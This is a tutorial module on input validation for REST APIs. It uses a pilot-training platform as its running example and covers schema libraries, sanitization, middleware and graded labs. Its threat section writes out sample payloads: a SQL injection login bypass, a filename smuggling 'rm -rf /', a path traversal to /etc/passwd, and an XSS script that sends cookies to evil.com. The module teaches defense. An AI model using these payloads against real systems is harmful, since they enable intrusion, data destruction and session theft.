# Module 5: Input Validation

Every piece of data your API receives is a potential attack vector. SQL injection, cross-site scripting, command injection, path traversal, and business logic exploits all start with malformed or malicious input. Input validation is the first line of defense.

This module covers input validation strategies for REST APIs: data type validation, format validation, business rule validation, sanitization, and how to design a validation system that catches attacks before they reach your database.

## The Threat Landscape

Before diving into validation techniques, understand what you are defending against.

### Injection Attacks

**SQL injection.** The attacker sends a payload that modifies the SQL query:

```
POST /api/v1/pilots/login
{
  "email": "admin@example.com' OR '1'='1' --",
  "password": "anything"
}
```

If the backend constructs the query by concatenating user input, this becomes:

```sql
SELECT * FROM pilots WHERE email = 'admin@example.com' OR '1'='1' --' AND password = 'anything'
```

The `--` comments out the password check. The query returns the first pilot record, which is typically the administrator. The attacker is now logged in as the admin.

**Command injection.** The attacker sends a payload that executes a system command:

```
POST /api/v1/reports/generate
{
  "filename": "report.pdf; rm -rf /"
}
```

If the backend passes this to a shell command without sanitization, the semicolon terminates the intended command and starts a new one that deletes the entire filesystem.

**Path traversal.** The attacker sends a payload that accesses files outside the intended directory:

```
GET /api/v1/documents/../../../../etc/passwd
```

If the backend does not sanitize the path, this reads the system password file.

**Cross-site scripting (XSS).** The attacker sends a payload that executes JavaScript in another user's browser:

```
POST /api/v1/pilots/profile
{
  "bio": "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
}
```

If the API returns this without encoding, any user viewing the profile has their session cookie stolen.

### Business Logic Attacks

These attacks use valid data formats but exploit business rules:

**Price manipulation:**
```
POST /api/v1/orders
{
  "product_id": "training_package_basic",
  "price": 0.01,  // Should be $299.99
  "quantity": 1
}
```

**Privilege escalation:**
```
PUT /api/v1/users/me
{
  "role": "admin"  // User tries to elevate their own role
}
```

**Race conditions:**
```
// Two simultaneous requests to withdraw funds
POST /api/v1/wallet/withdraw {"amount": 100}
POST /api/v1/wallet/withdraw {"amount": 100}
// If processed concurrently, both succeed even though the balance is only $100
```

## Validation Layers

Effective input validation uses multiple layers. Each layer catches a different class of problems.

### Layer 1: Content-Type Validation

Before parsing the body, verify the Content-Type header:

```javascript
function requireContentType(expectedType) {
  return (req, res, next) => {
    const contentType = req.headers['content-type'];
    
    if (!contentType || !contentType.includes(expectedType)) {
      return res.status(415).json({
        error: 'unsupported_media_type',
        message: `Expected Content-Type: ${expectedType}`
      });
    }
    
    next();
  };
}

app.post('/api/v1/pilots',
  authenticate,
  requireContentType('application/json'),
  createPilot
);
```

This catches requests that send XML when the API expects JSON, or form data when it expects JSON. It is a simple check but prevents a class of parsing-related vulnerabilities.

### Layer 2: Schema Validation

Schema validation checks that the request body matches a defined structure. Every field has a type, every required field is present, and no unexpected fields are included.

**Using Zod (Node.js):**

```javascript
const { z } = require('zod');

const createPilotSchema = z.object({
  email: z.string().email().max(255),
  first_name: z.string().min(1).max(100).trim(),
  last_name: z.string().min(1).max(100).trim(),
  date_of_birth: z.string().regex(/^\d{4}-\d{2}-\d{2}$/),
  phone: z.string().regex(/^\+?[1-9]\d{1,14}$/).optional(),
  license_number: z.string().min(5).max(20).optional()
});

app.post('/api/v1/pilots',
  authenticate,
  validateBody(createPilotSchema),
  createPilot
);

function validateBody(schema) {
  return (req, res, next) => {
    try {
      req.body = schema.parse(req.body);
      next();
    } catch (err) {
      return res.status(400).json({
        error: 'validation_error',
        message: 'Invalid request body',
        details: err.errors.map(e => ({
          field: e.path.join('.'),
          message: e.message
        }))
      });
    }
  };
}
```

**Using Joi (Node.js):**

```javascript
const Joi = require('joi');

const createPilotSchema = Joi.object({
  email: Joi.string().email().max(255).required(),
  first_name: Joi.string().min(1).max(100).trim().required(),
  last_name: Joi.string().min(1).max(100).trim().required(),
  date_of_birth: Joi.string().pattern(/^\d{4}-\d{2}-\d{2}$/).required(),
  phone: Joi.string().pattern(/^\+?[1-9]\d{1,14}$/).optional(),
  license_number: Joi.string().min(5).max(20).optional()
});
```

**Using Pydantic (Python):**

```python
from pydantic import BaseModel, EmailStr, Field
from typing import Optional
import re

class CreatePilot(BaseModel):
    email: EmailStr = Field(max_length=255)
    first_name: str = Field(min_length=1, max_length=100)
    last_name: str = Field(min_length=1, max_length=100)
    date_of_birth: str = Field(pattern=r'^\d{4}-\d{2}-\d{2}$')
    phone: Optional[str] = Field(pattern=r'^\+?[1-9]\d{1,14}$', default=None)
    license_number: Optional[str] = Field(min_length=5, max_length=20, default=None)
```

Schema validation catches:
- Missing required fields
- Wrong data types (string where number expected)
- Values outside allowed ranges
- Invalid formats (malformed email, phone number)
- Unexpected fields (the schema should reject unknown fields by default)

### Layer 3: Format Validation

Format validation checks that values match expected patterns:

```javascript
const validators = {
  email: (value) => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(value);
  },
  
  uuid: (value) => {
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    return uuidRegex.test(value);
  },
  
  date: (value) => {
    const dateRegex = /^\d{4}-\d{2}-\d{2}$/;
    if (!dateRegex.test(value)) return false;
    const date = new Date(value);
    return !isNaN(date.getTime());
  },
  
  phone: (value) => {
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    return phoneRegex.test(value);
  },
  
  ipv4: (value) => {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipv4Regex.test(value)) return false;
    return value.split('.').every(octet => {
      const num = parseInt(octet, 10);
      return num >= 0 && num <= 255;
    });
  }
};
```

### Layer 4: Business Rule Validation

Business rule validation checks that the data makes sense in the context of your domain:

```javascript
function validatePilotBusinessRules(pilot, existingPilot = null) {
  const errors = [];
  
  // Date of birth must be in the past
  if (new Date(pilot.date_of_birth) >= new Date()) {
    errors.push({
      field: 'date_of_birth',
      message: 'Date of birth must be in the past'
    });
  }
  
  // Pilot must be at least 16 years old
  const age = Math.floor((Date.now() - new Date(pilot.date_of_birth).getTime()) / (365.25 * 24 * 60 * 60 * 1000));
  if (age < 16) {
    errors.push({
      field: 'date_of_birth',
      message: 'Pilot must be at least 16 years old'
    });
  }
  
  // Email must be unique
  if (existingPilot && existingPilot.email !== pilot.email) {
    const emailTaken = await db.pilots.findOne({ email: pilot.email });
    if (emailTaken) {
      errors.push({
        field: 'email',
        message: 'Email is already registered'
      });
    }
  }
  
  // License number format must match country
  if (pilot.license_number) {
    const country = pilot.country || 'US';
    const licensePatterns = {
      US: /^FAA-[A-Z0-9]{6,10}$/,
      UK: /^GAM-[A-Z0-9]{5,8}$/,
      EU: /^EASA-[A-Z0-9]{6,10}$/
    };
    const pattern = licensePatterns[country];
    if (pattern && !pattern.test(pilot.license_number)) {
      errors.push({
        field: 'license_number',
        message: `Invalid license number format for ${country}`
      });
    }
  }
  
  return errors;
}
```

### Layer 5: Sanitization

Sanitization removes or encodes dangerous characters from input. It is not a substitute for validation: you should always validate first and sanitize as a defense-in-depth measure.

**HTML sanitization:**

```javascript
const sanitizeHtml = require('sanitize-html');

function sanitizeInput(input) {
  if (typeof input === 'string') {
    // Strip HTML tags
    return sanitizeHtml(input, {
      allowedTags: [],  // No HTML tags allowed
      allowedAttributes: {}
    });
  }
  
  if (typeof input === 'object' && input !== null) {
    const sanitized = {};
    for (const [key, value] of Object.entries(input)) {
      sanitized[key] = sanitizeInput(value);
    }
    return sanitized;
  }
  
  return input;
}
```

**SQL parameterization:**

```javascript
// BAD: String concatenation
const query = `SELECT * FROM pilots WHERE email = '${email}'`;

// GOOD: Parameterized query
const query = 'SELECT * FROM pilots WHERE email = $1';
const result = await db.query(query, [email]);
```

**Path sanitization:**

```javascript
const path = require('path');

function sanitizePath(userPath) {
  // Resolve to absolute path
  const resolved = path.resolve(userPath);
  
  // Ensure it is within the allowed directory
  const allowedDir = '/var/uploads/documents';
  if (!resolved.startsWith(allowedDir)) {
    throw new Error('Path traversal detected');
  }
  
  return resolved;
}
```

**Command sanitization:**

```javascript
const { execFile } = require('child_process');

// BAD: exec with string concatenation
exec(`convert ${userInput} output.pdf`);

// GOOD: execFile with argument array
execFile('convert', [userInput, 'output.pdf']);
```

## Validation for Different Data Types

### String Validation

```javascript
const stringSchema = z.object({
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name must be 100 characters or fewer')
    .trim()
    .regex(/^[a-zA-Z\s'-]+$/, 'Name contains invalid characters'),
    
  description: z.string()
    .max(5000, 'Description must be 5000 characters or fewer')
    .optional()
});
```

### Number Validation

```javascript
const numberSchema = z.object({
  quantity: z.number()
    .int('Quantity must be a whole number')
    .min(1, 'Quantity must be at least 1')
    .max(1000, 'Quantity must be 1000 or fewer'),
    
  price: z.number()
    .min(0, 'Price must be non-negative')
    .max(999999.99, 'Price exceeds maximum')
    .multipleOf(0.01, 'Price must have at most 2 decimal places')
});
```

### Date Validation

```javascript
const dateSchema = z.object({
  start_date: z.string()
    .regex(/^\d{4}-\d{2}-\d{2}$/, 'Date must be in YYYY-MM-DD format')
    .refine((date) => {
      const parsed = new Date(date);
      return !isNaN(parsed.getTime());
    }, 'Invalid date'),
    
  end_date: z.string()
    .regex(/^\d{4}-\d{2}-\d{2}$/, 'Date must be in YYYY-MM-DD format')
}).refine((data) => {
  return new Date(data.end_date) > new Date(data.start_date);
}, 'End date must be after start date');
```

### Array Validation

```javascript
const arraySchema = z.object({
  tags: z.array(z.string().min(1).max(50))
    .min(1, 'At least one tag is required')
    .max(10, 'Maximum 10 tags allowed')
    .refine((tags) => {
      return new Set(tags).size === tags.length;
    }, 'Tags must be unique')
});
```

### Nested Object Validation

```javascript
const nestedSchema = z.object({
  pilot: z.object({
    first_name: z.string().min(1).max(100),
    last_name: z.string().min(1).max(100),
    contact: z.object({
      email: z.string().email(),
      phone: z.string().regex(/^\+?[1-9]\d{1,14}$/).optional()
    })
  }),
  emergency_contact: z.object({
    name: z.string().min(1).max(100),
    phone: z.string().regex(/^\+?[1-9]\d{1,14}$/),
    relationship: z.string().min(1).max(50)
  })
});
```

## Query Parameter Validation

Query parameters are strings. You must parse and validate them:

```javascript
const listPilotsQuerySchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['created_at', 'last_name', 'email']).default('created_at'),
  order: z.enum(['asc', 'desc']).default('desc'),
  search: z.string().max(200).optional(),
  school_id: z.string().uuid().optional()
});

app.get('/api/v1/pilots',
  authenticate,
  validateQuery(listPilotsQuerySchema),
  listPilots
);
```

## Path Parameter Validation

Path parameters are always strings. Validate them:

```javascript
function validateUUID(paramName) {
  return (req, res, next) => {
    const value = req.params[paramName];
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    
    if (!uuidRegex.test(value)) {
      return res.status(400).json({
        error: 'invalid_parameter',
        message: `${paramName} must be a valid UUID`
      });
    }
    
    next();
  };
}

app.get('/api/v1/pilots/:id',
  authenticate,
  validateUUID('id'),
  getPilot
);
```

## Batch Input Validation

When an API accepts arrays of items (bulk operations), validate every item:

```javascript
const batchCreateSchema = z.object({
  items: z.array(createPilotSchema)
    .min(1, 'At least one item is required')
    .max(100, 'Maximum 100 items per batch'),
  stop_on_error: z.boolean().default(false)
});

app.post('/api/v1/pilots/batch',
  authenticate,
  validateBody(batchCreateSchema),
  async (req, res) => {
    const { items, stop_on_error } = req.body;
    const results = [];
    
    for (let i = 0; i < items.length; i++) {
      try {
        const pilot = await createPilot(items[i]);
        results.push({ index: i, status: 'success', data: pilot });
      } catch (err) {
        results.push({ index: i, status: 'error', error: err.message });
        if (stop_on_error) break;
      }
    }
    
    res.json({ results });
  }
);
```

## Real Scenario: Validating a Training Session Creation

Consider a flight training platform where instructors create training sessions. The request looks like:

```json
POST /api/v1/training-sessions
{
  "student_id": "550e8400-e29b-41d4-a716-446655440000",
  "aircraft_id": "660e8400-e29b-41d4-a716-446655440001",
  "instructor_id": "770e8400-e29b-41d4-a716-446655440002",
  "date": "2026-09-15",
  "start_time": "09:00",
  "end_time": "11:00",
  "session_type": "dual",
  "airfield": "KJFK",
  "notes": "First solo preparation"
}
```

The validation must check:

**Schema validation:**
- All UUID fields are valid UUIDs
- Date is in YYYY-MM-DD format
- Times are in HH:MM format
- Session type is one of: solo, dual, simulator, ground

**Business rule validation:**
- The student exists and is active
- The instructor exists and is certified for this session type
- The aircraft exists and is available during this time window
- The instructor is not double-booked
- The student is not double-booked
- The session is not in the past
- The session duration is between 30 minutes and 8 hours

```javascript
async function validateTrainingSession(session, requestingUser) {
  const errors = [];
  
  // Schema validation (handled by Zod)
  
  // Business rule validation
  const [student, instructor, aircraft] = await Promise.all([
    db.pilots.findOne({ id: session.student_id, status: 'active' }),
    db.pilots.findOne({ id: session.instructor_id, status: 'active', role: 'instructor' }),
    db.aircraft.findOne({ id: session.aircraft_id, status: 'available' })
  ]);
  
  if (!student) errors.push({ field: 'student_id', message: 'Student not found or inactive' });
  if (!instructor) errors.push({ field: 'instructor_id', message: 'Instructor not found or not certified' });
  if (!aircraft) errors.push({ field: 'aircraft_id', message: 'Aircraft not found or unavailable' });
  
  if (errors.length > 0) return errors;
  
  // Check for double-booking
  const startTime = new Date(`${session.date}T${session.start_time}`);
  const endTime = new Date(`${session.date}T${session.end_time}`);
  
  const conflicts = await db.training_sessions.findMany({
    where: {
      OR: [
        { instructor_id: session.instructor_id },
        { student_id: session.student_id },
        { aircraft_id: session.aircraft_id }
      ],
      status: { not: 'cancelled' },
      start_time: { lt: endTime },
      end_time: { gt: startTime }
    }
  });
  
  if (conflicts.length > 0) {
    errors.push({
      field: 'schedule',
      message: 'Time slot conflicts with existing session',
      conflicts: conflicts.map(c => ({ id: c.id, type: c.session_type }))
    });
  }
  
  // Check session is not in the past
  if (startTime < new Date()) {
    errors.push({ field: 'date', message: 'Cannot create session in the past' });
  }
  
  // Check session duration
  const durationMinutes = (endTime - startTime) / (1000 * 60);
  if (durationMinutes < 30) {
    errors.push({ field: 'end_time', message: 'Session must be at least 30 minutes' });
  }
  if (durationMinutes > 480) {
    errors.push({ field: 'end_time', message: 'Session cannot exceed 8 hours' });
  }
  
  return errors;
}
```

## Validation Error Response Format

Consistent error responses help clients handle validation failures:

```json
{
  "error": "validation_error",
  "message": "Request validation failed",
  "details": [
    {
      "field": "email",
      "message": "Invalid email format",
      "code": "invalid_format"
    },
    {
      "field": "date_of_birth",
      "message": "Date of birth must be in the past",
      "code": "invalid_date"
    },
    {
      "field": "license_number",
      "message": "License number is required for instructors",
      "code": "required_field"
    }
  ]
}
```

The `code` field is machine-readable. Clients can write code that handles specific error codes without parsing human-readable messages.

## Validation Middleware Patterns

### Request Body Validation

```javascript
function validateBody(schema) {
  return (req, res, next) => {
    try {
      req.body = schema.parse(req.body);
      next();
    } catch (err) {
      return res.status(400).json({
        error: 'validation_error',
        message: 'Invalid request body',
        details: err.errors.map(e => ({
          field: e.path.join('.'),
          message: e.message
        }))
      });
    }
  };
}
```

### Query Parameter Validation

```javascript
function validateQuery(schema) {
  return (req, res, next) => {
    try {
      req.query = schema.parse(req.query);
      next();
    } catch (err) {
      return res.status(400).json({
        error: 'validation_error',
        message: 'Invalid query parameters',
        details: err.errors.map(e => ({
          field: e.path.join('.'),
          message: e.message
        }))
      });
    }
  };
}
```

### Combined Validation

```javascript
function validate(schema) {
  return (req, res, next) => {
    try {
      if (schema.body) req.body = schema.body.parse(req.body);
      if (schema.query) req.query = schema.query.parse(req.query);
      if (schema.params) req.params = schema.params.parse(req.params);
      next();
    } catch (err) {
      return res.status(400).json({
        error: 'validation_error',
        message: 'Request validation failed',
        details: err.errors.map(e => ({
          location: e.path[0],
          field: e.path.slice(1).join('.'),
          message: e.message
        }))
      });
    }
  };
}

// Usage
app.put('/api/v1/pilots/:id',
  authenticate,
  validate({
    params: z.object({ id: z.string().uuid() }),
    body: updatePilotSchema
  }),
  updatePilot
);
```

## Advanced Validation Patterns

### Conditional Validation

Sometimes a field's validation depends on another field's value:

```javascript
const createSessionSchema = z.object({
  session_type: z.enum(['solo', 'dual', 'simulator', 'ground']),
  instructor_id: z.string().uuid().optional(),
  aircraft_id: z.string().uuid().optional(),
  simulator_id: z.string().uuid().optional()
}).refine((data) => {
  // Dual sessions require an instructor
  if (data.session_type === 'dual' && !data.instructor_id) {
    return false;
  }
  return true;
}, {
  message: 'Dual sessions require an instructor',
  path: ['instructor_id']
}).refine((data) => {
  // Simulator sessions require a simulator, not an aircraft
  if (data.session_type === 'simulator' && !data.simulator_id) {
    return false;
  }
  if (data.session_type === 'simulator' && data.aircraft_id) {
    return false;
  }
  return true;
}, {
  message: 'Simulator sessions require a simulator ID and no aircraft ID',
  path: ['simulator_id']
});
```

### Cross-Field Validation

Validate relationships between fields:

```javascript
const dateRangeSchema = z.object({
  start_date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/),
  start_time: z.string().regex(/^\d{2}:\d{2}$/),
  end_date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/),
  end_time: z.string().regex(/^\d{2}:\d{2}$/)
}).refine((data) => {
  const start = new Date(`${data.start_date}T${data.start_time}`);
  const end = new Date(`${data.end_date}T${data.end_time}`);
  return end > start;
}, {
  message: 'End time must be after start time'
}).refine((data) => {
  const start = new Date(`${data.start_date}T${data.start_time}`);
  const end = new Date(`${data.end_date}T${data.end_time}`);
  const durationHours = (end - start) / (1000 * 60 * 60);
  return durationHours <= 12;
}, {
  message: 'Session cannot exceed 12 hours'
});
```

### Dynamic Validation Rules

Load validation rules from a database or configuration file:

```javascript
async function getValidationRules(schoolId) {
  const rules = await db.validation_rules.findOne({ school_id: schoolId });
  
  return z.object({
    max_students_per_session: z.number().int().max(rules.max_students || 10),
    allowed_session_types: z.enum(rules.allowed_types || ['dual', 'solo']),
    min_advance_booking_hours: z.number().int().min(rules.min_advance || 2)
  });
}

app.post('/api/v1/training-sessions',
  authenticate,
  async (req, res, next) => {
    const rules = await getValidationRules(req.user.schoolId);
    validateBody(rules)(req, res, next);
  },
  createTrainingSession
);
```

### File Upload Validation

Validate uploaded files thoroughly:

```javascript
const multer = require('multer');
const path = require('path');

const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.pdf'];
    
    const ext = path.extname(file.originalname).toLowerCase();
    
    if (!allowedTypes.includes(file.mimetype)) {
      return cb(new AppError(400, 'invalid_file_type', 'File type not allowed'));
    }
    
    if (!allowedExtensions.includes(ext)) {
      return cb(new AppError(400, 'invalid_file_extension', 'File extension not allowed'));
    }
    
    cb(null, true);
  }
});

app.post('/api/v1/pilots/:id/documents',
  authenticate,
  upload.single('document'),
  validateDocumentMetadata,
  uploadDocument
);
```

### File Content Validation

Do not trust the file extension alone. Validate the actual file content:

```javascript
const fileType = require('file-type');

async function validateFileContent(filePath, expectedType) {
  const buffer = Buffer.alloc(4100);
  const fd = fs.openSync(filePath, 'r');
  fs.readSync(fd, buffer, 0, 4100, 0);
  fs.closeSync(fd);
  
  const detectedType = await fileType.fromBuffer(buffer);
  
  if (!detectedType || !expectedType.includes(detectedType.mime)) {
    throw new AppError(400, 'invalid_file_content', 'File content does not match expected type');
  }
  
  return detectedType;
}

// Usage
app.post('/api/v1/pilots/:id/documents',
  authenticate,
  upload.single('document'),
  async (req, res, next) => {
    if (req.file) {
      const detectedType = await validateFileContent(
        req.file.path,
        ['image/jpeg', 'image/png', 'application/pdf']
      );
      req.file.detectedType = detectedType;
    }
    next();
  },
  uploadDocument
);
```

### Request Size Limits

Enforce limits at multiple levels:

```javascript
// Express body parser limits
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ limit: '1mb', extended: true }));

// File upload limits
const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB per file
    files: 5, // Maximum 5 files
    fields: 10, // Maximum 10 non-file fields
    fieldSize: 1024 * 1024 // 1MB per non-file field
  }
});

// Custom request size middleware
function requestSizeLimit(maxSize) {
  return (req, res, next) => {
    const contentLength = parseInt(req.headers['content-length'] || '0');
    
    if (contentLength > maxSize) {
      return res.status(413).json({
        error: 'payload_too_large',
        message: `Request body exceeds ${maxSize / (1024 * 1024)}MB limit`
      });
    }
    
    next();
  };
}

app.post('/api/v1/pilots',
  authenticate,
  requestSizeLimit(5 * 1024 * 1024),
  validateBody(createPilotSchema),
  createPilot
);
```

### Encoding Validation

Ensure text inputs are properly encoded:

```javascript
function validateStringEncoding(req, res, next) {
  const contentType = req.headers['content-type'] || '';
  
  if (contentType.includes('application/json')) {
    // Check for BOM (Byte Order Mark)
    const rawBody = req.rawBody?.toString();
    if (rawBody && rawBody.charCodeAt(0) === 0xFEFF) {
      return res.status(400).json({
        error: 'invalid_encoding',
        message: 'Request body contains BOM. Please remove it.'
      });
    }
  }
  
  next();
}

app.use(validateStringEncoding);
```

### Unicode Validation

Validate that strings contain only expected Unicode characters:

```javascript
function containsOnlyPrintableAscii(str) {
  // Allow ASCII printable characters (32-126) plus common whitespace
  return /^[\x20-\x7E\t\n\r]*$/.test(str);
}

function containsNoControlCharacters(str) {
  // Reject control characters except tab, newline, carriage return
  return !/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(str);
}

const safeStringSchema = z.string()
  .refine(containsOnlyPrintableAscii, 'String contains non-ASCII characters')
  .refine(containsNoControlCharacters, 'String contains control characters');
```

### Validation Testing

Test your validation schemas thoroughly:

```javascript
describe('createPilotSchema validation', () => {
  test('accepts valid pilot data', () => {
    const input = {
      email: 'pilot@example.com',
      first_name: 'John',
      last_name: 'Doe',
      date_of_birth: '1990-01-15'
    };
    
    const result = createPilotSchema.safeParse(input);
    expect(result.success).toBe(true);
  });
  
  test('rejects invalid email format', () => {
    const input = {
      email: 'not-an-email',
      first_name: 'John',
      last_name: 'Doe',
      date_of_birth: '1990-01-15'
    };
    
    const result = createPilotSchema.safeParse(input);
    expect(result.success).toBe(false);
    expect(result.error.issues[0].path).toContain('email');
  });
  
  test('rejects SQL injection in name', () => {
    const input = {
      email: 'pilot@example.com',
      first_name: "John'; DROP TABLE pilots; --",
      last_name: 'Doe',
      date_of_birth: '1990-01-15'
    };
    
    const result = createPilotSchema.safeParse(input);
    expect(result.success).toBe(true); // Schema validation passes
    // But sanitization should strip the dangerous characters
  });
  
  test('rejects XSS in bio field', () => {
    const input = {
      email: 'pilot@example.com',
      first_name: 'John',
      last_name: 'Doe',
      date_of_birth: '1990-01-15',
      bio: '<script>alert("xss")</script>'
    };
    
    const result = createPilotSchema.safeParse(input);
    expect(result.success).toBe(true); // Schema validation passes
    // But sanitization should strip the script tags
  });
});
```

### Validation Performance

Optimize validation for high-traffic APIs:

```javascript
// Compile schemas once, reuse many times
const createPilotSchema = z.object({...});
const compiledCreatePilot = createPilotSchema; // Zod compiles automatically

// Use async validation for database checks
async function validateEmailUniqueness(email) {
  const exists = await db.pilots.findOne({ email });
  return !exists;
}

// Cache validation results for repeated inputs
const validationCache = new Map();

function cachedValidation(schema, data, cacheKey) {
  if (validationCache.has(cacheKey)) {
    return validationCache.get(cacheKey);
  }
  
  const result = schema.safeParse(data);
  validationCache.set(cacheKey, result);
  
  // Clear cache after 5 minutes
  setTimeout(() => validationCache.delete(cacheKey), 5 * 60 * 1000);
  
  return result;
}
```

### Validation Logging

Log validation failures for security monitoring:

```javascript
function logValidationFailure(req, errors) {
  logger.warn({
    event: 'validation_failure',
    request_id: req.requestId,
    path: req.path,
    method: req.method,
    client_ip: req.ip,
    user_agent: req.headers['user-agent'],
    errors: errors.map(e => ({
      field: e.field,
      message: e.message,
      code: e.code
    })),
    body: sanitizeBody(req.body)
  });
  
  // Track validation failures per IP
  const key = `validation_failures:${req.ip}`;
  redis.incr(key);
  redis.expire(key, 3600); // 1 hour window
  
  // Alert on high failure rate
  redis.get(key).then(count => {
    if (count > 100) {
      alertSecurity({
        alert: 'high_validation_failure_rate',
        client_ip: req.ip,
        count: count,
        path: req.path
      });
    }
  });
}
```

## Assessment

**Lab 1: Schema Design** (40 minutes)

Write a complete validation schema for a training session creation endpoint. The schema must include: 3 UUID fields, 2 date/time fields, 1 enum field, 2 optional string fields, and 1 numeric field. Write the schema in Zod (JavaScript) or Pydantic (Python). Include 3 business rules that depend on external data.

Grading: 30 points. 2 points per correctly validated field, 6 points for each business rule, 6 points for proper error formatting.

**Lab 2: Injection Prevention** (35 minutes)

For each of these attack vectors, write the vulnerable code, explain how the attack works, and write the corrected code: SQL injection, command injection, path traversal, XSS. Include the malicious payload that triggers each vulnerability.

Grading: 28 points. 7 points per attack vector (vulnerable code, explanation, corrected code, payload).

**Lab 3: Batch Validation** (30 minutes)

Design a batch validation strategy for an endpoint that accepts 50 items in a single request. Specify: how to handle individual item failures, whether to continue or stop on error, how to report results, and how to handle rate limiting (should batch requests count as 1 request or 50?).

Grading: 22 points. 5 points per correctly handled concern.

## Evidence

- OWASP Input Validation: owasp.org/www-community/input_validation
- SQL Injection Prevention: owasp.org/www-community/attacks/SQL_Injection
- XSS Prevention: owasp.org/xss
- Zod documentation: zod.dev
- Pydantic documentation: docs.pydantic.dev
- Path Traversal: CWE-22 (cwe.mitre.org)
- Command Injection: CWE-78 (cwe.mitre.org)
